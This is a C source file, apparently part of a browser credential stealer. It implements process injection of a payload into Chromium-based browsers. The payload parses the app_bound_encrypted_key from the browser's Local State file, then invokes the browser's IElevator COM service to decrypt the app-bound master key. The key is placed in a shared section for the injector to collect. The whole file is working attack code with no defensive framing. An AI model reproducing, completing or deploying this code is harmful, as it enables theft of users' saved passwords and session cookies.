#include "AbeDecrypt.h"

/*** data shared with the in-browser payload ***/

#pragma data_seg(".abedata")
__declspec(allocate(".abedata"))
volatile LONG g_Pending = 0;
__declspec(allocate(".abedata"))
volatile LONG g_Code = (LONG)E_FAIL;
__declspec(allocate(".abedata"))
volatile BYTE g_Key[ABE_KEY_SIZE];
#pragma data_seg()

/* request block patched into the mapped image before injection */
#pragma data_seg(".abereq")
__declspec(allocate(".abereq"))
volatile ABE_REQUEST g_Request = { 0 };
#pragma data_seg()

/* prepares the request block scanned by the payload (raw Local State text) */
_Success_(return)
BOOL
AbePrepareRequest(
    _In_ const NET_BROWSER_INFO* Browser)
{
    WCHAR LocalState[MAX_PATH];
    PVOID Text;
    ULONG Length;
    NTSTATUS Status;

    Str_PrintfExW(LocalState, MAX_PATH, L"%ls\\Local State", Browser->UserDataDir);
    Status = IO_ReadWin32FileToBuffer(LocalState, &Text, &Length);
    if (!NT_SUCCESS(Status))
    {
        return FALSE;
    }
    if (Length > sizeof(g_Request.LocalState))
    {
        Mem_Free(Text);
        return FALSE;
    }
    if (Length != 0)
    {
        RtlCopyMemory((PVOID)g_Request.LocalState, Text, Length);
    }
    Mem_Free(Text);
    g_Request.BrowserType = Browser->Type;
    g_Request.LocalStateLength = Length;
    return TRUE;
}

/*** payload: runs inside the browser process ***/

/* IElevator::DecryptData vtable slot signature */
typedef HRESULT (WINAPI *PFN_IELEVATOR_DECRYPT_DATA)(PVOID This, BSTR In, BSTR* Out, DWORD* LastError);

/* IUnknown::Release vtable slot signature */
typedef ULONG (WINAPI *PFN_IUNKNOWN_RELEASE)(PVOID This);

VOID
AbePayloadWorker(VOID)
{
    static BYTE Blob[2048];
    const ABE_BROWSER* Browser = NULL;
    typeof(&CoInitializeEx) CoInit;
    typeof(&CoUninitialize) CoUninit;
    typeof(&CoCreateInstance) CoCreate;
    typeof(&CoSetProxyBlanket) CoBlanket;
    typeof(&SysAllocStringByteLen) SysAllocByteLen;
    typeof(&SysStringByteLen) SysByteLen;
    typeof(&SysFreeString) SysFree;
    typeof(&CryptStringToBinaryA) CryptStrToBin;
    PVOID Elevator = NULL;
    BSTR In = NULL, Out = NULL;
    ULONG Index, TagLength, Base64Limit, Base64Length = 0;
    PCSTR Base64 = NULL;
    LONG Code = (LONG)E_FAIL;
    HRESULT Hr = E_FAIL;
    BYTE* Text = (BYTE*)g_Request.LocalState;

    /* runs before CRT init in the remote image: everything must be resolved dynamically */
    if (g_Request.BrowserType < NetBrowserMax)
    {
        Browser = &AbeBrowsers[g_Request.BrowserType];
    }

    TagLength = sizeof("\"app_bound_encrypted_key\":\"") - 1;
    for (Index = 0; Browser && Index + TagLength <= g_Request.LocalStateLength; Index++)
    {
        if (Text[Index] == '"' &&
            memcmp(Text + Index, "\"app_bound_encrypted_key\":\"", TagLength) == 0)
        {
            Base64 = (PCSTR)Text + Index + TagLength;
            break;
        }
    }
    if (Base64 != NULL)
    {
        /* never scan past the valid part of the request buffer */
        Base64Limit = g_Request.LocalStateLength - (ULONG)(Base64 - (PCSTR)g_Request.LocalState);
        while (Base64Length < Base64Limit && Base64[Base64Length] != '"')
        {
            Base64Length++;
        }
    }

    CryptStrToBin = (typeof(CryptStrToBin))GetProcAddress(LoadLibraryW(L"crypt32.dll"),
                                                          "CryptStringToBinaryA");
    if (Base64 != NULL && CryptStrToBin != NULL &&
        (CoInit = (typeof(CoInit))GetProcAddress(LoadLibraryW(L"ole32.dll"), "CoInitializeEx")) != NULL &&
        (CoUninit = (typeof(CoUninit))GetProcAddress(GetModuleHandleW(L"ole32.dll"), "CoUninitialize")) != NULL &&
        (CoCreate = (typeof(CoCreate))GetProcAddress(GetModuleHandleW(L"ole32.dll"), "CoCreateInstance")) != NULL &&
        (CoBlanket = (typeof(CoBlanket))GetProcAddress(GetModuleHandleW(L"ole32.dll"), "CoSetProxyBlanket")) != NULL &&
        (SysAllocByteLen = (typeof(SysAllocByteLen))GetProcAddress(LoadLibraryW(L"oleaut32.dll"),
                                                                   "SysAllocStringByteLen")) != NULL &&
        (SysByteLen = (typeof(SysByteLen))GetProcAddress(GetModuleHandleW(L"oleaut32.dll"),
                                                         "SysStringByteLen")) != NULL &&
        (SysFree = (typeof(SysFree))GetProcAddress(GetModuleHandleW(L"oleaut32.dll"), "SysFreeString")) != NULL)
    {
        /* BlobLength is in/out capacity of Blob */
        ULONG BlobLength = sizeof(Blob);
        DWORD LastError;

        if (CryptStrToBin(Base64,
                          Base64Length,
                          CRYPT_STRING_BASE64,
                          Blob,
                          &BlobLength,
                          NULL,
                          NULL) &&
            BlobLength > 4 && memcmp(Blob, "APPB", 4) == 0)
        {
            Hr = CoInit(NULL, COINIT_APARTMENTTHREADED);
            if (SUCCEEDED(Hr))
            {
                Hr = CoCreate(&Browser->Clsid,
                              NULL,
                              CLSCTX_LOCAL_SERVER,
                              &Browser->Iid,
                              &Elevator);
                if (SUCCEEDED(Hr))
                {
                    Hr = CoBlanket(Elevator,
                                   RPC_C_AUTHN_DEFAULT,
                                   RPC_C_AUTHZ_DEFAULT,
                                   NULL,
                                   RPC_C_AUTHN_LEVEL_PKT_PRIVACY,
                                   RPC_C_IMP_LEVEL_IMPERSONATE,
                                   NULL,
                                   EOAC_DYNAMIC_CLOAKING);
                    if (SUCCEEDED(Hr))
                    {
                        In = SysAllocByteLen((PCSTR)Blob + 4, BlobLength - 4);
                        if (In == NULL)
                        {
                            Hr = E_OUTOFMEMORY;
                        } else
                        {
                            Hr = ((PFN_IELEVATOR_DECRYPT_DATA)((*(PVOID***)Elevator)[Browser->DecryptSlot]))(
                                Elevator,
                                In,
                                &Out,
                                &LastError);
                            if (SUCCEEDED(Hr) && Out != NULL && SysByteLen(Out) == ABE_KEY_SIZE)
                            {
                                RtlCopyMemory((PVOID)g_Key, Out, ABE_KEY_SIZE);
                                Code = 0;
                            }
                        }
                    }
                    ((PFN_IUNKNOWN_RELEASE)((*(PVOID***)Elevator)[2]))(Elevator);
                }
                CoUninit();
            }
        }
        /* release the COM allocations in the host (browser) process */
        if (In != NULL)
        {
            SysFree(In);
        }
        if (Out != NULL)
        {
            SysFree(Out);
        }
    }
    g_Code = Code == 0 ? 0 : (LONG)(FAILED(Hr) ? Hr : E_FAIL);
    g_Pending = 1;
}

/* Hijack entry: zero-arg, parks until reaped */
VOID
AbeHijackEntry(VOID)
{
    AbePayloadWorker();
    for (;;)
    {
        PS_DelayExec(INFINITE);
    }
}

/* Inject entry: thread-proc signature, returns so the remote thread can exit */
DWORD WINAPI
AbeInjectEntry(LPVOID Param)
{
    UNREFERENCED_PARAMETER(Param);
    AbePayloadWorker();
    return 0;
}
